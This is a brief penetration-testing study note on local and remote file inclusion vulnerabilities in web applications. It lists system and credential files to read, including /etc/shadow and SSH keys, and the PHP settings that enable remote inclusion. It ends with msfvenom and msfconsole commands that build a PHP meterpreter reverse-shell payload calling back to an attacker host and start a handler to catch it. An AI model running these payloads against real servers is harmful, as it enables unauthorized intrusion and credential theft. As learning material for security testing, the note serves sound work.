## File Inclusion Vulnerability
File Inclusion Vulnerability allows unauthorized file inclusion in web apps, potentially executing arbitrary code.
- allows to include files within the wbe application
- if not coded properly, it can allow an attacker to include files from the server
- Loal File Inclusion (LFI) and Remote File Inclusion (RFI)
- RFI affects php applications (mostly php)

### LFI
- Ability to read local files on the victiom machine
- you can only view and access files that the server has permission.
- files to look for Linux
  - /etc/passwd
  - /etc/shadow
  - /etc/issue
  - /etc/hosts
  - /etc/hostname
- files to look for Windows
  - C:\boot.ini
  - C:\Windows\win.ini
  - C:\Windows\System32\drivers\etc\hosts

#### if LFI how to use
- find users (normally 1000 in linux)
- can you view ssh keys
- can you view logs or sensitive data
- can you leverage it with ssh or something else

### RFI
- affects php
- load scripts into server from own server
- leverage to get shell 
- to load script from own in php.ini must be set:
  - allow_url_include = On 
  - allow_url_fopen = On
- maybe file to transport need to have specific name
  - when it tries to get wp-load.php for example than name file 
  - also an idea is to try with HTTP 1.0 instead of 1.1 


#### Reverse Shell for it with msfvenom
```sh
msfvenom -p php/meterpreter/reverse_tcp LHOST=<attacker-ip> LPORT=<attacker-port> -f raw > shell.php #  creates a php file that creates a shell and connect to attacker
msfconsole -x "use exploit/multi/handler; set payload php/meterpreter/reverse_tcp; set LHOST <attacker-ip>; set LPORT <attacker-port>; run -j" # starts a handler for the shell
# that shell.php need to be included to the server with the over RFI than the handler will catch the shell
```
